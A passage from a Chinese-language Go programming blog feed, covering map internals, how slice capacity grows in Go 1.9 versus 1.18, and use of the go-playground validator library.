中每个键的哈希值的最高字节。 如果 tophash[0] &lt; minTopHash，则 tophash[0] 是一个桶疏散状态。</p><p>map 在编译期间确定 map 中 key、value 及桶的大小，因此在运行时仅仅通过指针操作就可以找到特定位置的元素。编译期动态地创建一个新的结构体：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> bmap <span class="hljs-keyword">struct</span> &#123;<br>    topbits  [<span class="hljs-number">8</span>]<span class="hljs-type">uint8</span><br>    keys     [<span class="hljs-number">8</span>]keytype<br>    values   [<span class="hljs-number">8</span>]valuetype<br>    pad      <span class="hljs-type">uintptr</span><br>    overflow <span class="hljs-type">uintptr</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>bmap</code> 就是我们常说的“桶”，桶里面会最多装 8 个 key，这些 key 之所以会落入同一个桶，是因为它们经过哈希计算后，哈希结果是“一类”的。在桶内，又会根据 key 计算出来的 hash 值的高 8 位来决定 key 到底落入桶内的哪个位置（一个桶内最多有8个位置）。桶在存储的 tophash 字段后，会存储 key 数组和 value 数组。</p><p>整体结构图如下：</p><p><img src="https://golang.design/go-questions/map/assets/0.png" alt="hashmap bmap"></p><h2 id="map的创建"><a href="#map的创建" class="headerlink" title="map的创建"></a>map的创建</h2><p>go中map的创建，汇编底层调用的是 <code>makemap</code> 函数，主要做的工作就是初始化 <code>hmap</code> 结构体的各种字段，例如设置哈希种子 hash0 等。</p><p>源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makemap</span><span class="hljs-params">(t *maptype, hint <span class="hljs-type">int64</span>, h *hmap, bucket unsafe.Pointer)</span></span> *hmap &#123;<br><span class="hljs-comment">// 省略各种条件检查...</span><br><br><span class="hljs-comment">// 找到一个 B，使得 map 的装载因子在正常范围内</span><br>B := <span class="hljs-type">uint8</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> ; overLoadFactor(hint, B); B++ &#123;<br>&#125;<br><br><span class="hljs-comment">// 初始化 hash table</span><br><span class="hljs-comment">// 如果 B 等于 0，那么 buckets 就会在赋值的时候再分配</span><br><span class="hljs-comment">// 如果长度比较大，分配内存会花费长一点</span><br>buckets := bucket<br><span class="hljs-keyword">var</span> extra *mapextra<br><span class="hljs-keyword">if</span> B != <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">var</span> nextOverflow *bmap<br>buckets, nextOverflow = makeBucketArray(t, B)<br><span class="hljs-keyword">if</span> nextOverflow != <span class="hljs-literal">nil</span> &#123;<br>extra = <span class="hljs-built_in">new</span>(mapextra)<br>extra.nextOverflow = nextOverflow<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 初始化 hamp</span><br><span class="hljs-keyword">if</span> h == <span class="hljs-literal">nil</span> &#123;<br>h = (*hmap)(newobject(t.hmap))<br>&#125;<br>h.count = <span class="hljs-number">0</span><br>h.B = B<br>h.extra = extra<br>h.flags = <span class="hljs-number">0</span><br>h.hash0 = fastrand()<br>h.buckets = buckets<br>h.oldbuckets = <span class="hljs-literal">nil</span><br>h.nevacuate = <span class="hljs-number">0</span><br>h.noverflow = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">return</span> h<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://golang.design/go-questions/map/principal/">https://golang.design/go-questions/map/principal/</a></p><p>2.深入理解 Go 语言的 map 实现原理，<a href="https://juejin.cn/post/7060128992870793246">https://juejin.cn/post/7060128992870793246</a></p><p>3.<a href="https://link.juejin.cn/?target=https://golangforall.com/en/post/map-principles-golang.html">Principles of map type in GO</a></p><p>4.<a href="https://link.juejin.cn/?target=https://studygolang.com/articles/21047">大话图解golang map</a></p><p>5.<a href="https://link.juejin.cn/?target=https://golang.design/go-questions/map/principal/">map 的实现原理</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang 切片容量是怎么扩大的？</title>
    <link href="/2022/12/12/Golang%E5%88%87%E7%89%87%E5%AE%B9%E9%87%8F%E6%98%AF%E6%80%8E%E4%B9%88%E6%89%A9%E5%A4%A7%E7%9A%84%EF%BC%9F/"/>
    <url>/2022/12/12/Golang%E5%88%87%E7%89%87%E5%AE%B9%E9%87%8F%E6%98%AF%E6%80%8E%E4%B9%88%E6%89%A9%E5%A4%A7%E7%9A%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang-切片容量是怎么扩大的？"><a href="#Golang-切片容量是怎么扩大的？" class="headerlink" title="Golang 切片容量是怎么扩大的？"></a>Golang 切片容量是怎么扩大的？</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Go中，数组就是一片连续的内存， slice 实际上是一个结构体，包含三个字段：长度、容量、底层数组。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// runtime/slice.go</span><br><span class="hljs-keyword">type</span> slice <span class="hljs-keyword">struct</span> &#123;<br>array unsafe.Pointer <span class="hljs-comment">// 元素指针</span><br><span class="hljs-built_in">len</span>   <span class="hljs-type">int</span> <span class="hljs-comment">// 长度 </span><br><span class="hljs-built_in">cap</span>   <span class="hljs-type">int</span> <span class="hljs-comment">// 容量</span><br>&#125;<br></code></pre></td></tr></table></figure><p>切片的数据结构如下：</p><p><img src="https://golang.design/go-questions/slice/assets/0.png"></p><p>切片的数据结构中，包含一个指向数组的指针 <code>array</code> ，当前长度 <code>len</code> ，以及最大容量 <code>cap</code> 。在使用 <code>make([]int, len)</code> 创建切片时，实际上还有第三个可选参数 <code>cap</code> ，也即 <code>make([]int, len, cap)</code> 。在不声明 <code>cap</code> 的情况下，默认 <code>cap=len</code> 。当切片长度没有超过容量时，对切片新增数据，不会改变 <code>array</code> 指针的值。</p><p>当对切片进行 <code>append</code> 操作，导致长度超出容量时，就会创建新的数组，这会导致和原有切片的分离。</p><p>需要注意的是，底层数组是可以被多个 slice 同时指向的，因此对一个 slice 的元素进行操作是有可能影响到其他 slice 的。为了避免因为切片是否发生扩容的问题导致bug，最好的处理办法还是在必要时使用 <code>copy</code> 来复制数据，保证得到一个新的切片，以避免后续操作带来预料之外的副作用。</p><p>下面看看用 <code>a := []int&#123;&#125;</code> 这种方式来创建切片会是什么情况。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">a := []int&#123;&#125;<br>for i := 0; i &lt; 16; i++ &#123;<br>    a = append(a, i)<br>    fmt.Print(cap(a), &quot; &quot;)<br>&#125;<br>//<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 4 </span>4<span class="hljs-number"> 8 </span>8<span class="hljs-number"> 8 </span>8<span class="hljs-number"> 16 </span>16<span class="hljs-number"> 16 </span>16<span class="hljs-number"> 16 </span>16<span class="hljs-number"> 16 </span>16<br></code></pre></td></tr></table></figure><p>可以看到，空切片的容量为0，但后面向切片中添加元素时，并不是每次切片的容量都发生了变化。这是因为，如果增大容量，也即需要创建新数组，这时还需要将原数组中的所有元素复制到新数组中，开销很大，所以GoLang设计了一套扩容机制，以减少需要创建新数组的次数。但这导致无法很直接地判断 <code>append</code> 时是否创建了新数组。</p><h2 id="Golang的扩容机制"><a href="#Golang的扩容机制" class="headerlink" title="Golang的扩容机制"></a>Golang的扩容机制</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用 append 可以向 slice 追加元素，实际上是往底层数组添加元素。但是底层数组的长度是固定的，如果索引 <code>len-1</code> 所指向的元素已经是底层数组的最后一个元素，就没法再添加了。</p><p>这时，slice 会迁移到新的内存位置，新底层数组的长度也会增加，这样就可以放置新增的元素。同时，为了应对未来可能再次发生的 append 操作，新的底层数组的长度，也就是新 <code>slice</code> 的容量是留了一定的 <code>buffer</code> 的。否则，每次添加元素的时候，都会发生迁移，成本太高。</p><p>新 slice 预留的 <code>buffer</code> 大小是有一定规律的。在golang1.18版本更新之前网上大多数的文章都是这样描述slice的扩容策略的：</p><blockquote><p>当原 slice 容量小于 <code>1024</code> 的时候，新 slice 容量变成原来的 <code>2</code> 倍；原 slice 容量超过 <code>1024</code>，新 slice 容量变成原来的<code>1.25</code>倍。</p></blockquote><p>在1.18版本更新之后，slice的扩容策略变为了：</p><blockquote><p>当原slice容量(oldcap)小于256的时候，新slice(newcap)容量为原来的2倍；原slice容量超过256，新slice容量newcap &#x3D; oldcap+(oldcap+3*256)&#x2F;4</p></blockquote><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><strong>golang版本1.9</strong></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// go 1.9 src/runtime/slice.go:82</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">growslice</span><span class="hljs-params">(et *_type, old slice, <span class="hljs-built_in">cap</span> <span class="hljs-type">int</span>)</span></span> slice &#123;<br>    <span class="hljs-comment">// ……</span><br>    newcap := old.<span class="hljs-built_in">cap</span><br>doublecap := newcap + newcap<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">cap</span> &gt; doublecap &#123;<br>newcap = <span class="hljs-built_in">cap</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> old.<span class="hljs-built_in">len</span> &lt; <span class="hljs-number">1024</span> &#123;<br>newcap = doublecap<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">for</span> newcap &lt; <span class="hljs-built_in">cap</span> &#123;<br>newcap += newcap / <span class="hljs-number">4</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// ……</span><br><br>capmem = roundupsize(<span class="hljs-type">uintptr</span>(newcap) * ptrSize)<br>newcap = <span class="hljs-type">int</span>(capmem / ptrSize)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>golang版本1.18</strong></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// go 1.18 src/runtime/slice.go:178</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">growslice</span><span class="hljs-params">(et *_type, old slice, <span class="hljs-built_in">cap</span> <span class="hljs-type">int</span>)</span></span> slice &#123;<br>    <span class="hljs-comment">// ……</span><br>    newcap := old.<span class="hljs-built_in">cap</span><br>doublecap := newcap + newcap<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">cap</span> &gt; doublecap &#123;<br>newcap = <span class="hljs-built_in">cap</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">const</span> threshold = <span class="hljs-number">256</span><br><span class="hljs-keyword">if</span> old.<span class="hljs-built_in">cap</span> &lt; threshold &#123;<br>newcap = doublecap<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">for</span> <span class="hljs-number">0</span> &lt; newcap &amp;&amp; newcap &lt; <span class="hljs-built_in">cap</span> &#123;<br>                <span class="hljs-comment">// Transition from growing 2x for small slices</span><br><span class="hljs-comment">// to growing 1.25x for large slices. This formula</span><br><span class="hljs-comment">// gives a smooth-ish transition between the two.</span><br>newcap += (newcap + <span class="hljs-number">3</span>*threshold) / <span class="hljs-number">4</span><br>&#125;<br><span class="hljs-keyword">if</span> newcap &lt;= <span class="hljs-number">0</span> &#123;<br>newcap = <span class="hljs-built_in">cap</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// ……</span><br>    <br>capmem = roundupsize(<span class="hljs-type">uintptr</span>(newcap) * ptrSize)<br>newcap = <span class="hljs-type">int</span>(capmem / ptrSize)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>切片的容量是怎么增长的<a href="https://golang.design/go-questions/slice/grow/">https://golang.design/go-questions/slice/grow/</a></li><li>GoLang中的切片扩容机制，<a href="https://studygolang.com/articles/21396">https://studygolang.com/articles/21396</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 经典校验库 validator</title>
    <link href="/2022/12/08/Go%E7%BB%8F%E5%85%B8%E6%A0%A1%E9%AA%8C%E5%BA%93validator/"/>
    <url>/2022/12/08/Go%E7%BB%8F%E5%85%B8%E6%A0%A1%E9%AA%8C%E5%BA%93validator/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-经典校验库-validator"><a href="#Go-经典校验库-validator" class="headerlink" title="Go 经典校验库 validator"></a>Go 经典校验库 validator</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://link.juejin.cn/?target=https://github.com/go-playground/validator">validator</a> 是一个结构体参数验证器。用于对数据进行校验。在 Web 开发中，对用户传过来的数据我们都需要进行严格校验，防止用户的恶意请求。例如日期格式，用户年龄，性别等必须是正常的值。经典的 <a href="https://link.juejin.cn/?target=https://github.com/gin-gonic/gin">gin</a> 框架就是用了 validator 作为默认的校验器。它的能力能够帮助开发者最大程度地减少【基础校验】的代码，你只需要一个 tag 就能完成校验。</p><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package main<br><br><span class="hljs-keyword">import</span> (<br>&quot;fmt&quot;<br><br>    &quot;github.com/go-playground/validator/v10&quot;<br>)<br><br><span class="hljs-keyword">type</span> <span class="hljs-keyword">User</span> struct &#123;<br><span class="hljs-type">Name</span> string `<span class="hljs-keyword">validate</span>:&quot;min=6,max=10&quot;`<br>Age  <span class="hljs-type">int</span>    `<span class="hljs-keyword">validate</span>:&quot;min=1,max=100&quot;`<br>&#125;<br><br>func main() &#123;<br>    //启动时初始化<br><span class="hljs-keyword">validate</span> := <span class="hljs-keyword">validator</span>.<span class="hljs-built_in">New</span>()<br><br>u1 := <span class="hljs-keyword">User</span>&#123;<span class="hljs-type">Name</span>: &quot;lidajun&quot;, Age: <span class="hljs-number">18</span>&#125;<br>err := <span class="hljs-keyword">validate</span>.Struct(u1)<br>fmt.Println(err)<br><br>u2 := <span class="hljs-keyword">User</span>&#123;<span class="hljs-type">Name</span>: &quot;dj&quot;, Age: <span class="hljs-number">101</span>&#125;<br>err = <span class="hljs-keyword">validate</span>.Struct(u2)<br>fmt.Println(err)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>validator</code>在结构体标签（<code>struct tag</code>）中定义字段的<strong>约束</strong>。使用<code>validator</code>验证数据之前，调用<code>validator.New()</code>创建一个<strong>验证器</strong>，这个验证器可以指定选项、添加自定义约束，然后通过调用它的<code>Struct()</code>方法来验证各种结构对象的字段是否符合定义的约束。</p><p>总的来说只需要三步即可：</p><ol><li>调用 <code>validator.New()</code> 初始化一个校验器；</li><li>将【待校验的结构体】传入我们的校验器的 <code>Struct</code> 方法中；</li><li>校验返回的 error 是否为 nil 即可。</li></ol><p>在上面代码中，我们定义了一个结构体<code>User</code>，<code>User</code>有名称<code>Name</code>字段和年龄<code>Age</code>字段。通过<code>min</code>和<code>max</code>约束，我们设置<code>Name</code>的字符串长度为<code>[6,10]</code>之间，<code>Age</code>的范围为<code>[1,100]</code>。</p><p>第一个对象<code>Name</code>和<code>Age</code>字段都满足约束，故<code>Struct()</code>方法返回<code>nil</code>错误。第二个对象的<code>Name</code>字段值为<code>dj</code>，长度 2，小于最小值<code>min</code>，<code>Age</code>字段值为 101，大于最大值<code>max</code>，故返回错误：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">&lt;nil&gt;<br><span class="hljs-keyword">Key</span>: <span class="hljs-string">&#x27;User.Name&#x27;</span> <span class="hljs-keyword">Error</span>:Field validation for <span class="hljs-string">&#x27;Name&#x27;</span> failed <span class="hljs-keyword">on</span> the <span class="hljs-string">&#x27;min&#x27;</span> tag<br><span class="hljs-keyword">Key</span>: <span class="hljs-string">&#x27;User.Age&#x27;</span> <span class="hljs-keyword">Error</span>:Field validation for <span class="hljs-string">&#x27;Age&#x27;</span> failed <span class="hljs-keyword">on</span> the <span class="hljs-string">&#x27;max&#x27;</span> tag<br></code></pre></td></tr></table></figure><p>错误信息比较好理解，<code>User.Name</code>违反了<code>min</code>约束，<code>User.Age</code>违反了<code>max</code>约束，一眼就能看出问题所在。</p><h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p><code>validator</code>提供了非常丰富的约束可供使用，下面依次来介绍。</p><h3 id="范围约束"><a href="#范围约束" class="headerlink" title="范围约束"></a>范围约束</h3><p>我们上面已经看到了使用<code>min</code>和<code>max</code>来约束字符串的长度或数值的范围，下面再介绍其它的范围约束。范围约束的字段类型有以下几种：</p><ul><li>对于数值，则约束其值；</li><li>对于字符串，则约束其长度；</li><li>对于切片、数组和<code>map</code>，则约束其长度。</li></ul><p>下面如未特殊说明，则是根据上面各个类型对应的值与参数值比较。</p><ul><li><code>len</code>：等于参数值，例如<code>len=10</code>；</li><li><code>max</code>：小于等于参数值，例如<code>max=10</code>；</li><li><code>min</code>：大于等于参数值，例如<code>min=10</code>；</li><li><code>eq</code>：等于参数值，注意与<code>len</code>不同。对于字符串，<code>eq</code>约束字符串本身的值，而<code>len</code>约束字符串长度。例如<code>eq=10</code>；</li><li><code>ne</code>：不等于参数值，例如<code>ne=10</code>；</li><li><code>gt</code>：大于参数值，例如<code>gt=10</code>；</li><li><code>gte</code>：大于等于参数值，例如<code>gte=10</code>；</li><li><code>lt</code>：小于参数值，例如<code>lt=10</code>；</li><li><code>lte</code>：小于等于参数值，例如<code>lte=10</code>；</li><li><code>oneof</code>：只能是列举出的值其中一个，这些值必须是数值或字符串，以空格分隔，如果字符串中有空格，将字符串用单引号包围，例如<code>oneof=red green</code>。</li></ul><h3 id="跨字段约束"><a href="#跨字段约束" class="headerlink" title="跨字段约束"></a>跨字段约束</h3><p><code>validator</code>允许定义跨字段的约束，即该字段与其他字段之间的关系。这种约束实际上分为两种，一种是参数字段就是同一个结构中的平级字段，另一种是参数字段为结构中其他字段的字段。约束语法很简单，要想使用上面的约束语义，只需要稍微修改一下。例如<strong>相等约束</strong>（<code>eq</code>），如果是约束同一个结构中的字段，则在后面添加一个<code>field</code>，使用<code>eqfield</code>定义字段间的相等约束。如果是更深层次的字段，在<code>field</code>之前还需要加上<code>cs</code>（可以理解为<code>cross-struct</code>），<code>eq</code>就变为<code>eqcsfield</code>。它们的参数值都是需要比较的字段名，内层的还需要加上字段的类型。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><code>validator</code>中关于字符串的约束有很多，这里介绍几个：</p><ul><li><code>contains=</code>：包含参数子串，例如<code>contains=email</code>；</li><li><code>containsany</code>：包含参数中任意的 UNICODE 字符，例如<code>containsany=abcd</code>；</li><li><code>containsrune</code>：包含参数表示的 rune 字符，例如<code>containsrune=☻</code>；</li><li><code>excludes</code>：不包含参数子串，例如<code>excludes=email</code>；</li><li><code>excludesall</code>：不包含参数中任意的 UNICODE 字符，例如<code>excludesall=abcd</code>；</li><li><code>excludesrune</code>：不包含参数表示的 rune 字符，<code>excludesrune=☻</code>；</li><li><code>startswith</code>：以参数子串为前缀，例如<code>startswith=hello</code>；</li><li><code>endswith</code>：以参数子串为后缀，例如<code>endswith=bye</code>。</li></ul><h3 id="唯一性"><a href="#唯一性" class="headerlink" title="唯一性"></a>唯一性</h3><p>使用<code>unqiue</code>来指定唯一性约束，对不同类型的处理如下：</p><ul><li>对于数组和切片，<code>unique</code>约束没有重复的元素；</li><li>对于<code>map</code>，<code>unique</code>约束没有重复的<strong>值</strong>；</li><li>对于元素类型为结构体的切片，<code>unique</code>约束结构体对象的某个字段不重复，通过<code>unqiue=field</code>指定这个字段名。</li></ul><h3 id="特殊"><a href="#特殊" class="headerlink" title="特殊"></a>特殊</h3><p>有一些比较特殊的约束：</p><ul><li><code>-</code>：跳过该字段，不检验；</li><li><code>|</code>：使用多个约束，只需要满足其中一个，例如<code>rgb|rgba</code>；</li><li><code>required</code>：字段必须设置，不能为默认值；</li><li><code>omitempty</code>：如果字段未设置，则忽略它。</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><code>validator</code>提供了大量的、各个方面的、丰富的约束，如<code>ASCII/UNICODE</code>字母、数字、十六进制、十六进制颜色值、大小写、RBG 颜色值，HSL 颜色值、HSLA 颜色值、<strong>JSON 格式</strong>、<strong>文件路径</strong>、URL、base64 编码串、<strong>ip 地址</strong>、ipv4、ipv6、UUID、经纬度等等。想看完整的建议参考<a href="https://link.juejin.cn/?target=https://pkg.go.dev/github.com/go-playground/validator/v10%23hdr-Baked_In_Validators_and_Tags">文档</a> 以及仓库 <a href="https://link.juejin.cn/?target=https://github.com/go-playground/validator">README</a></p><h2 id="VarWithValue方法"><a href="#VarWithValue方法" class="headerlink" title="VarWithValue方法"></a>VarWithValue方法</h2><p>在一些很简单的情况下，我们仅仅想对两个变量进行比较，如果每次都要先定义结构和<code>tag</code>就太繁琐了。<code>validator</code>提供了<code>VarWithValue()</code>方法，我们只需要传入要验证的两个变量和约束即可</p><h2 id="自定义约束"><a href="#自定义约束" class="headerlink" title="自定义约束"></a>自定义约束</h2><p>除了使用<code>validator</code>提供的约束外，还可以定义自己的约束。例如现在有个奇葩的需求，产品同学要求用户必须使用回文串作为用户名，我们可以自定义这个约束：</p><p>首先定义一个类型为<code>func (validator.FieldLevel) bool</code>的函数检查约束是否满足，可以通过<code>FieldLevel</code>取出要检查的字段的信息。然后，调用验证器的<code>RegisterValidation()</code>方法将该约束注册到指定的名字上。最后我们就可以在结构体中使用该约束。上面程序中，第二个对象不满足约束<code>palindrome</code>，输出：</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>Golang 的 error 是个 interface，默认其实只提供了 Error() 这一个方法，返回一个字符串，能力比较鸡肋。同样的，validator 返回的错误信息也是个字符串：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">Key</span>: <span class="hljs-string">&#x27;User.Name&#x27;</span> <span class="hljs-keyword">Error</span>:Field validation for <span class="hljs-string">&#x27;Name&#x27;</span> failed <span class="hljs-keyword">on</span> the <span class="hljs-string">&#x27;min&#x27;</span> tag<br></code></pre></td></tr></table></figure><p>这样当然不错，但问题在于，线上环境下，很多时候我们并不是【人工地】来阅读错误信息，这里的 error 最终是要转化成错误信息展现给用户，或者打点上报的。</p><p>其实，我们可以进行更精准的处理。<code>validator</code>返回的错误实际上只有两种，一种是参数错误，一种是校验错误。参数错误时，返回<code>InvalidValidationError</code>类型；校验错误时返回<code>ValidationErrors</code>，它们都实现了<code>error</code>接口。而且<code>ValidationErrors</code>是一个错误切片，它保存了每个字段违反的每个约束信息：</p><p>所以<code>validator</code>校验返回的结果只有 3 种情况：</p><ul><li><code>nil</code>：没有错误；</li><li><code>InvalidValidationError</code>：输入参数错误；</li><li><code>ValidationErrors</code>：字段违反约束。</li></ul><p>我们可以在程序中判断<code>err != nil</code>时，依次将<code>err</code>转换为<code>InvalidValidationError</code>和<code>ValidationErrors</code>以获取更详细的信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processErr</span><span class="hljs-params">(err <span class="hljs-type">error</span>)</span></span> &#123;<br>  <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-keyword">return</span><br>  &#125;<br><br>  invalid, ok := err.(*validator.InvalidValidationError)<br>  <span class="hljs-keyword">if</span> ok &#123;<br>    fmt.Println(<span class="hljs-string">&quot;param error:&quot;</span>, invalid)<br>    <span class="hljs-keyword">return</span><br>  &#125;<br><br>  validationErrs := err.(validator.ValidationErrors)<br>  <span class="hljs-keyword">for</span> _, validationErr := <span class="hljs-keyword">range</span> validationErrs &#123;<br>    fmt.Println(validationErr)<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  validate := validator.New()<br><br>  err := validate.Struct(<span class="hljs-number">1</span>)<br>  processErr(err)<br><br>  err = validate.VarWithValue(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&quot;eqfield&quot;</span>)<br>  processErr(err)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>validator</code>功能非常丰富，使用较为简单方便。本篇文章介绍的约束只是其中的冰山一角，想看完整的建议参考<a href="https://link.juejin.cn/?target=https://pkg.go.dev/github.com/go-playground/validator/v10%23hdr-Baked_In_Validators_and_Tags">文档</a> 以及仓库 <a href="https://link.juejin.cn/?target=https://github.com/go-playground/validator">README</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>validator GitHub：<a href="https://github.com/go-playground/validator">https://github.com/go-playground/validator</a></li><li>Go 每日一库 GitHub：<a href="https://github.com/darjun/go-daily-lib">https://github.com/darjun/go-daily-lib</a></li><li>解析 Golang 经典校验库 validator 用法：<a href="https://juejin.cn/post/7135803728916905997">https://juejin.cn/post/7135803728916905997</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于consul实现watch机制</title>
